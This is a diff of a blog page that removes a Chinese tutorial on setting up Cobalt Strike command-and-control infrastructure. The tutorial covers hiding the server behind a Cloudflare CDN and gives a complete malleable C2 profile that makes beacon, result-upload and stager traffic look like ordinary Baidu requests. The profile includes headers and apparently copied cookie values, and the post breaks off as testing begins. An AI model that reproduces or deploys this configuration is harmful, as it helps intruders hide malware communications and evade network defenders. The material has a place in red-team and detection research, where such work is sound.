@@ -152,334 +152,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/" class="post-title-link" itemprop="url">记基于cobaltstrike基础设施架构设计尝试</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-09-08 11:11:22" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-10-12 10:59:14" itemprop="dateModified" datetime="2020-10-12T10:59:14+08:00">2020-10-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
-                    <span itemprop="name">cobaltstrike</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        通过之前的介绍我们了解了cobaltstrike的一些混淆或者隐藏的策略，这次我们主要对学到的这些策略进行实践，设计一个比较好用的不容易被反查的方案。</p>
-<p>​        设计思路如下：</p>
-<ul>
-<li><p>自定义mallable c2 profile文件，自定义通讯流量</p>
-</li>
-<li><p>前置机通过mod_rewrite对不同流量进行不同的转发</p>
-</li>
-<li><p>给前置机配置CDN保护前置机的真实IP</p>
-</li>
-<li><p>teamserver主机配置防火墙仅允许前置机和teamserver主机的特定端口通信</p>
-<p>因为CDN配置需要等待一段时间才能生效，所以我们先来配置CDN。</p>
-</li>
-</ul>
-<h3 id="cloudflare配置免费CDN"><a href="#cloudflare配置免费CDN" class="headerlink" title="cloudflare配置免费CDN"></a>cloudflare配置免费CDN</h3><p>​        在<a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener">cloudflare</a>提供了免费的CDN,我们可以申请一个账号，登录后首先选择添加站点</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908113445450.png" alt="image-20200908113445450"></p>
-<p>​            选择add a site添加我们想要配置CDN的域名后，选择free也就是免费的CND，确定后会来到如下界面，选择continue</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114452692.png" alt="image-20200908114452692"></p>
-<p>​        然后需要我们去我们自己的域名控制台去修改记录。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114648182.png" alt="image-20200908114648182"></p>
-<p>​        我这里的域名是在腾讯云注册的，因此我来到腾讯云的控制台来修改</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114925213.png" alt="image-20200908114925213"></p>
-<p>​        找到注册商这里点击管理</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115122093.png" alt="image-20200908115122093"></p>
-<p>​        对DNS服务器进行修改，修改为cloudflare</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115215847.png" alt="image-20200908115215847"></p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115641139.png" alt="image-20200908115641139"></p>
-<p>​        将NS记录也做一下修改</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120045948.png" alt="image-20200908120045948"></p>
-<p>​        设置好以后我们来到cloudflare，选择确认后会有一些配置，全选择默认就好了。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120217855.png" alt="image-20200908120217855"></p>
-<p>​        配置好以后刚开是域名可能还是下面的状态</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120401476.png" alt="image-20200908120401476"></p>
-<p>​        点击域名后往下拉，有个re-check的按钮，可以通过这个来检测配置是否生效，这个需要一段时间才可以生效。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120439002.png" alt="image-20200908120439002"></p>
-<p>​        稍微等待一会以后，再去查看域名，发现状态变成了active，这说明配置的解析已经生效了</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121034826.png" alt="image-20200908121034826"></p>
-<p>​        进入域名以后，我们可以看到这里已经提示配置成功了，我们再去选择DNS对解析记录进行修改</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121124053.png" alt="image-20200908121124053"></p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121316626.png" alt="image-20200908121316626"></p>
-<p>​        配置好以后我们再去ping我们的域名可以看到得到的IP是cloudflare节点的IP</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121455393.png" alt="image-20200908121455393"></p>
-<h3 id="自定义Mallable-C2-流量"><a href="#自定义Mallable-C2-流量" class="headerlink" title="自定义Mallable C2 流量"></a>自定义Mallable C2 流量</h3><p>​        之前我们了解过关于Mallable C2 profile文件的编写，今天我们尝试着去编写一个profile文件，因为百度在国内用的也比较多，所以我将尝试以百度为例来进行流量混淆。</p>
-<p>​        首先是一些是一些基本的配置信息，这些配置和流量本身没有太大关系，所以可以先配置这部分的信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  &#x2F;&#x2F;延时5秒左右</span><br><span class="line">set jitter    &quot;30&quot;;   &#x2F;&#x2F;配置延时的波动百分比，我们这里也控制在百分之30</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;user-agent配置</span><br><span class="line"></span><br><span class="line">###SMB options###    &#x2F;&#x2F;smb 命名管道名称的配置</span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;nbtsvcs&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>​        下来我们要配置一些和百度有关的流量部分的配置,因为我们设置profile文件的目的就是使我们的通信流量模拟百度的通信流量，因此我们首先要分析百度的流量，从中选择比较合适的流量。首先我们先来看下访问百度网站时的请求头的流量。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144452608.png" alt="image-20200908144452608"></p>
-<p>​        我们根据百度的请求头来编写我们配置GET请求部分，下面这部分是客户端和teamserver服务端获取执行命令时的url的配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;no-cors&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29A3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1591203863; BAIDUID&#x3D;7B3B91054F6B7A69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; H_PS_645EC&#x3D;bc01FRkCkZHub5%2Fa5TNP%2Bnfm1rK01EMDjcigAfzJf0hSG5tXtJ5cc%2Fug9m4w3cQnMZxL; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        配置好请求包后我们还要配置返回包,返回包原始内容如下</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144621899.png" alt="image-20200908144621899"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   server &#123;</span><br><span class="line"></span><br><span class="line">header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">       output &#123;</span><br><span class="line">           netbios;</span><br><span class="line">           prepend &quot;                 &quot;;</span><br><span class="line">   		prepend &quot;GIF89a&quot;;</span><br><span class="line">   		append &quot;;&quot;;</span><br><span class="line">           print;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        我们再来配置一下http-post，这个主要是用来客户端给服务端返回命令执行的结果。首先我们先要选择一个适合伪装流量的请求，这个流量需要去向服务端发送大量的信息，但是返回信息却不用很多，经过查看发现百度大部分是请求时get请求，有一个请求会发送一个加密的url信息，所以我尝试通过伪造这个url来获取客户端的返回信息。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908150138010.png" alt="image-20200908150138010"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">       </span><br><span class="line">		header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;%E5%8D%B0%E5%BA%A6%E5%A4%96%E9%95%BF%E5%86%8D%E8%B0%88%E4%B8%AD%E5%8D%B0%E8%BE%B9%E5%A2%83%E7%B4%A7%E5%BC%A0%E5%B1%80%E5%8A%BF&amp;rsv_idx&#x3D;2&amp;tn&#x3D;baiduhome_pg&amp;usm&#x3D;2&amp;ie&#x3D;utf-8&amp;rsv_cq&#x3D;&amp;rsv_dl&#x3D;0_right_fyb_pchot_20811_01&amp;rsf&#x3D;392deae71492ecf08ccf48e0d95afc29_1_15_1&amp;rqid&#x3D;d04f8f9d00035648&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; ISSW&#x3D;1; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX&quot;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        我们再看下该如何配置下载stage的请求，我们知道这个请求会下载一个200多k的一个文件我们先找找有没有下载文件的请求。我们可以去以加载百度logo伪装的流量下载stage</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908152245517.png" alt="image-20200908152245517"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">	header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">    header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;</span><br><span class="line">            print;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        配置好这些信息后我们最后再配置一下stage的混淆</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        好了，差不多就配置完成了，我们将这个整体用cl2int去测试一下</p>
